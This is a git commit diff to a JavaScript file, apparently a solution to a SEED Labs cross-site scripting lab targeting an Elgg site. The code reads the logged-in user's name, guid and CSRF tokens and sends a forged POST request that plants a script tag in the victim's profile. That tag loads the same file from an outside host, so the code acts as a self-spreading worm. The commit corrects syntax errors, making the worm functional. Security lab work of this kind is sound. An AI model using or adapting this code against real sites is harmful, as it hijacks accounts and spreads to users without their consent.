353c767a1b7301580b5e78228052981b71320ce4
Oliver Greenwood <greenwood672.dev@gmail.com>
2025-05-23 16:51:24 +0100

    Update seed2.js

--- public/seed2.js
+++ public/seed2.js
@@ -1,18 +1,18 @@
  window.onload=function(){
  //JavaScriptcodetoaccessusername,userguid,TimeStamp__elgg_ts
  //andSecurityToken__elgg_token
- varuserName="&name="+elgg.session.user.name;
- varguid="&guid="+elgg.session.user.guid;
- varts="&__elgg_ts="+elgg.security.token.__elgg_ts;
- vartoken="&__elgg_token="+elgg.security.token.__elgg_token;
+ var userName="&name="+elgg.session.user.name;
+ var guid="&guid="+elgg.session.user.guid;
+ var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+ var token="&__elgg_token="+elgg.security.token.__elgg_token;
  //Constructthecontentofyoururl.
- varcontent="<script type='text/javascript' src='https://www.ogwood.dev/seed2.js'></script>"; //FILLIN
- varsamyGuid=59; //FILLIN
- varsendurl="http://www.seed-server.com/profile/" + elgg.session.user.name + varuserName + varguid + varts + vartoken + "&briefdescription=" + varcontent; //FILLIN
- if(elgg.session.user.guid!=varsamyGuid)
+ var content="<script type='text/javascript' src='https://www.ogwood.dev/seed2.js'></script>"; //FILLIN
+ var samyGuid=59; //FILLIN
+ var sendurl="http://www.seed-server.com/profile/" + elgg.session.user.name + userName + guid + ts + token + "&briefdescription=" + content; //FILLIN
+ if(elgg.session.user.guid!=samyGuid)
  {
  //CreateandsendAjaxrequesttomodifyprofile
- varAjax=null;
+ var Ajax=null;
  Ajax=new XMLHttpRequest();
  Ajax.open("POST",sendurl,true);
  Ajax.setRequestHeader("Content-Type",
